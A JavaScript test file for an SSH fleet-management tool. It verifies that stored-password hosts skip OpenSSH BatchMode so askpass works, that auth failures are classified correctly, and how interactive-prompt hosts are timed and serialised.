// OpenSSH disables password/keyboard-interactive auth under BatchMode BEFORE
// ever consulting SSH_ASKPASS, so the whole stored-password feature is dead
// on real OpenSSH unless sshEnvForHost drops batch for every path that
// actually attempts a connection with a password (stored askpass + the
// interactive prompt passthrough) — batch:true stays for key hosts only.
// ---------------------------------------------------------------------------

test('C1: sshEnvForHost returns batch:false for a STORED password source (env/keychain/command), not just the interactive prompt', async () => {
  const { sshEnvForHost } = await import('../src/fleet.js');
  const ssh = { bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' };
  for (const entry of [
    { name: 'a', dest: 'me@a', auth: 'password', source: 'env', env: 'PW' },
    { name: 'b', dest: 'me@b', auth: 'password', source: 'keychain', service: 's', account: 'ac' },
    { name: 'c', dest: 'me@c', auth: 'password', source: 'command', cmd: 'op read x' },
  ]) {
    const r = sshEnvForHost(entry, { ssh, helperPath: '/s/askpass.sh', interactive: false });
    assert.equal(r.batch, false, `${entry.source} source must return batch:false so BatchMode=yes never reaches argv`);
    assert.ok(!r.needsAuth, `${entry.source} source with valid ssh.askpass should not need auth`);
  }
});

test('C1: key hosts still get batch:true (unspecified → sshArgs default), no regression', async () => {
  const { sshEnvForHost } = await import('../src/fleet.js');
  const ssh = { bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' };
  const r = sshEnvForHost({ name: 'v', dest: 'u@v', auth: 'key' }, { ssh, helperPath: '/x', interactive: false });
  assert.notEqual(r.batch, false);
});

test('C1: fetchHost composes sshArgs WITHOUT BatchMode=yes for a stored-source password host', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  let seenArgs;
  const spawnFn = (bin, args) => { seenArgs = args; return fakeSshOk(); };
  await fetchHost('gpu', { dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' },
    { spawnFn, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.doesNotMatch(seenArgs.join(' '), /BatchMode/, 'BatchMode=yes must never ride with a stored askpass password host');
});

test('C1: remoteAction composes sshArgs WITHOUT BatchMode=yes for a stored-source password host', async () => {
  const { remoteAction } = await import('../src/fleet.js');
  let seenArgs;
  const spawnFn = (bin, args) => {
    seenArgs = args;
    return fakeSsh({ stdout: frameEnvelope({ schema: S, minSchema: 1, result: 'ok' }) })();
  };
  await remoteAction('gpu', { dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' }, 'resume', 'k1',
    { spawnFn, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.doesNotMatch(seenArgs.join(' '), /BatchMode/);
});

test('C1: AUTH_FAIL_RE tightened — a non-auth 255 whose banner merely mentions "password" is no longer mislabeled needs-auth', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  // Real OpenSSH auth failures always look like "Permission denied (...)."
  // A banner that just happens to contain the word "password" (e.g. a motd
  // or a connection-refused message) must NOT be mislabeled as needs-auth.
  const notAuthFailure = fakeSsh({ code: 255, stderr: 'kex_exchange_identification: read: Connection reset by password-gated proxy\n' });
  const r = await fetchHost('gpu', { dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' },
    { spawnFn: notAuthFailure, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.equal(r.state, 'unreachable', 'a non "Permission denied (" banner must stay unreachable, not needs-auth');

  // Genuine auth failures (the real OpenSSH shape) still classify correctly.
  const realAuthFailure = fakeSsh({ code: 255, stderr: 'Permission denied (password).\n' });
  const r2 = await fetchHost('gpu', { dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' },
    { spawnFn: realAuthFailure, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.equal(r2.state, 'needs-auth');
});

// The regression that permanently guards C1: a fake `ssh` binary that
// reproduces real OpenSSH's actual gate order — refuses password auth the
// instant BatchMode=yes is on its argv (255, "Permission denied (password).",
// never touching SSH_ASKPASS), and otherwise (BatchMode absent) honors
// SSH_ASKPASS_REQUIRE=force by shelling out to the real askpass helper this
// codebase provisions, exactly as real ssh would. This is spawned as a real
// child process (never the real system `ssh`, never a real host) so it pins
// actual OpenSSH gate-ordering semantics rather than a JS mock's assumptions.
test('C1 regression: real-OpenSSH-shaped fake ssh refuses password auth under BatchMode, succeeds without it', async () => {
  const { fetchHost, writeHosts, readHosts } = await import('../src/fleet.js');
  const { execFileSync } = await import('node:child_process');

  const fakeSshDir = mkdtempSync(join(tmpdir(), 'unsnooze-c1-fakessh-'));
  const expectedSecret = 'c1-regression-secret-42';
  const envelope = { schema: 1, minSchema: 1, cli: 'x', host: 'c1regress', caps: [], sessions: [] };
  const framed = BEGIN + JSON.stringify(envelope) + END;

  const fakeSshPath = join(fakeSshDir, 'fake-ssh.js');
  writeFileSync(fakeSshPath, `#!/usr/bin/env node
const { execFileSync } = require('child_process');
const args = process.argv.slice(2);
function refuse() {
  process.stderr.write('Permission denied (password).\\n');
  process.exit(255);
}
// Real OpenSSH: BatchMode=yes disables password/keyboard-interactive auth
// BEFORE ever consulting SSH_ASKPASS.
if (args.includes('BatchMode=yes')) refuse();
if (!process.env.SSH_ASKPASS || process.env.SSH_ASKPASS_REQUIRE !== 'force') refuse();
let secret = '';
try {
  secret = execFileSync(process.env.SSH_ASKPASS, ['Password:'], { encoding: 'utf8' });
} catch (e) { refuse(); }
if (secret.trim() !== ${JSON.stringify(expectedSecret)}) refuse();
process.stdout.write(${JSON.stringify(framed)});
process.exit(0);
`);
  chmodSync(fakeSshPath, 0o755);

  // Real hosts.json entry so the real `_askpass` subcommand (invoked by the
  // real helper script the fake ssh shells out to) can resolve the source.
  const priorHosts = readHosts();
  writeHosts({
    ...Object.fromEntries(Object.entries(priorHosts).map(([n, e]) => [n, e.auth === 'key' ? e.dest : e])),
    c1regress: {
      dest: 'gpu-dest', auth: 'password', source: 'command',
      cmd: `${JSON.stringify(process.execPath)} -e ${JSON.stringify(`process.stdout.write(${JSON.stringify(expectedSecret)})`)}`,
    },
  });

  const entry = readHosts().c1regress;
  const r = await fetchHost('c1regress', entry, {
    detect: () => ({ bin: fakeSshPath, askpass: true, multiplex: true, flavor: 'unix' }),
    timeoutMs: 10_000,
  });

  assert.equal(r.state, 'online', `expected online (BatchMode absent → askpass runs), got ${r.state}: ${r.error}`);

  rmSync(fakeSshDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// I1 (IMPORTANT): interactive-prompt hosts (batch:false, ssh prompting on
// /dev/tty) must not share the default 8s kill timeout with the rest of the
// fleet, and must never run concurrently with each other (concurrent
// /dev/tty prompts would interleave and corrupt each other's no-echo state).
// ---------------------------------------------------------------------------

test('I1: fetchFleet does not SIGKILL an interactive-prompt host at the old default 8s timeout', { timeout: 20_000 }, async () => {
  const { fetchFleet } = await import('../src/fleet.js');
  const hosts = { lap: { dest: 'me@lap', auth: 'password', source: 'prompt' } };
  // A slow typist: this "ssh" only resolves after 8.2s — longer than the
  // fetchHost-standalone default of 8000ms. If fetchFleet applied that same
  // default here, this host would be SIGKILLed mid-typing.
  const spawnFn = fakeSsh({ stdout: GOOD, delayMs: 8_200 });
  const results = await fetchFleet({ hosts, spawnFn, interactive: true });
  assert.equal(results[0].state, 'online', `must not be killed at the old 8s default: ${results[0].error}`);
});

test('I1: fetchFleet runs interactive-prompt hosts serially (never concurrently), while non-interactive hosts keep pooled concurrency', async () => {
  const { fetchFleet } = await import('../src/fleet.js');
  const hosts = {
    lap1: { dest: 'me@lap1', auth: 'password', source: 'prompt' },
    lap2: { dest: 'me@lap2', auth: 'password', source: 'prompt' },
    key1: 'key1-dest',
    key2: 'key2-dest',
  };
  let activePrompt = 0;
  let maxActivePrompt = 0;
  let activeOther = 0;
  let maxActiveOther = 0;
  const spawnFn = (bin, args) => {
    const isPrompt = !args.join(' ').includes('BatchMode');
    if (isPrompt) {
      activePrompt++; maxActivePrompt = Math.max(maxActivePrompt, activePrompt);
    } else {
      activeOther++; maxActiveOther = Math.max(maxActiveOther, activeOther);
    }
    const p = new EventEmitter();
    p.stdout = new EventEmitter();
    p.stderr = new EventEmitter();
    p.kill = () => { p.killed = true; };
    setTimeout(() => {
      if (isPrompt) activePrompt--; else activeOther--;
      p.stdout.emit('data', Buffer.from(GOOD));
      p.emit('close', 0);
    }, 30);
    return p;
  };
  const results = await fetchFleet({ hosts, spawnFn, interactive: true, concurrency: 4, timeoutMs: 2000 });
  assert.equal(results.length, 4);
  assert.equal(maxActivePrompt, 1, 'interactive-prompt hosts must never overlap (concurrency 1)');
  assert.ok(maxActiveOther >= 1, 'non-interactive hosts still ran');
});

// ---------------------------------------------------------------------------
// Cheap fixes folded in alongside C1/I1
// ---------------------------------------------------------------------------

// M2: differentiate the needs-auth reason so "ssh too old" and "no terminal
// to prompt from" don't both collapse into the same generic message.
test('M2: sshEnvForHost differentiates needsAuth reasons (ssh too old vs prompt-with-no-terminal)', async () => {
  const { sshEnvForHost } = await import('../src/fleet.js');
  const tooOld = sshEnvForHost({ name: 'g', dest: 'm@g', auth: 'password', source: 'env', env: 'PW' },
    { ssh: { bin: 'ssh', askpass: false, multiplex: true, flavor: 'unix' }, helperPath: '/x', interactive: false });
  assert.equal(tooOld.needsAuth, true);
  assert.match(tooOld.error, /ssh too old|unrecognized/i);

  const noTerminal = sshEnvForHost({ name: 'lap', dest: 'me@lap', auth: 'password', source: 'prompt' },
    { ssh: { bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }, helperPath: '/x', interactive: false });
  assert.equal(noTerminal.needsAuth, true);
  assert.notEqual(noTerminal.error, tooOld.error, 'the two needs-auth causes must not share one generic message');
});

test('M2: fetchHost surfaces the differentiated needsAuth reason (not the old generic "no resolvable credential")', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const r = await fetchHost('g', { dest: 'm@g', auth: 'password', source: 'env', env: 'PW' },
    { spawnFn: () => fakeSshOk(), detect: () => ({ bin: 'ssh', askpass: false, multiplex: true, flavor: 'unix' }) });
  assert.equal(r.state, 'needs-auth');
  assert.match(r.error, /ssh too old|unrecognized/i);
});

// M3: a `prompt`-source host must not be read in phase 1 of `hosts test` —
// that would prompt the user once for the check and again on connect.
test('M3: cmdHosts test on a prompt-source host skips the phase-1 credential read (no double prompt)', async () => {
  const { cmdHosts, writeHosts } = await import('../src/fleet.js');
  writeHosts({ prompthost: { dest: 'me@prompthost', auth: 'password', source: 'prompt' } });
  const logs = [];
  const origLog = console.log;
  console.log = (...a) => logs.push(a.join(' '));
  try {
    // Phase 2 legitimately fails here (test runner stdin isn't a TTY, so
    // there's nothing to prompt from over the real transport) — that's
    // phase 2's job. What M3 targets is phase 1: it must print the
    // interactive note and never attempt (and fail on) a resolveSecret
    // read of its own, which would be a distinct, earlier failure line.
    await cmdHosts(['test', 'prompthost'], { spawnFn: fakeSshOk, timeoutMs: 200 });
  } finally {
    console.log = origLog;
  }
  const out = logs.join('\n');
  assert.equal(logs[0], 'unsnooze: auth: interactive — will prompt on connect',
    'phase 1 must be exactly the interactive note, not a resolveSecret failure');
  assert.ok(!out.includes('unsnooze: auth: no terminal for prompt'),
    'phase 1 must not have tried to resolveSecret the prompt source itself');
});

// M4: `hosts add` success message is auth-appropriate (not "ssh key access"
// for a password host), and a `hosts test` failure no longer repeats the
// reason text twice.
test('M4: hosts add success message is auth-appropriate for password vs key hosts', async () => {
  const { cmdHosts } = await import('../src/fleet.js');
  const logs = [];
  const origLog = console.log;
  console.log = (...a) => logs.push(a.join(' '));
  try {
    await cmdHosts(['add', 'm4key', 'me@m4key']);
    await cmdHosts(['add', 'm4pw', 'me@m4pw', '--auth', 'password', '--source', 'env', '--env', 'UNSNOOZE_PW_M4']);
  } finally {
    console.log = origLog;
  }
  const keyMsg = logs.find(l => l.includes('m4key'));
  const pwMsg = logs.find(l => l.includes('m4pw'));
  assert.match(keyMsg, /ssh key access/);
  assert.doesNotMatch(pwMsg, /ssh key access/, 'a password host must not claim it needs ssh key access');
  assert.match(pwMsg, /password/i);
});

test('M4: hosts test failure does not repeat the full reason text twice', async () => {
  const { cmdHosts, writeHosts } = await import('../src/fleet.js');
  writeHosts({ m4fail: { dest: 'me@m4fail', auth: 'password', source: 'env', env: 'UNSNOOZE_PW_M4FAIL' } });
  delete process.env.UNSNOOZE_PW_M4FAIL;
  const logs = [];
  const origLog = console.log;
  console.log = (...a) => logs.push(a.join(' '));
  let code;
  try {
    code = await cmdHosts(['test', 'm4fail'], { spawnFn: fakeSshOk, timeoutMs: 200 });
  } finally {
    console.log = origLog;
  }
  const out = logs.join('\n');
  assert.equal(code, 1);
  const occurrences = (out.match(/UNSNOOZE_PW_M4FAIL is not set/g) || []).length;
  assert.equal(occurrences, 1, `the reason text must appear once, not duplicated (got ${occurrences})`);
  assert.match(out, /needs-setup/);
});
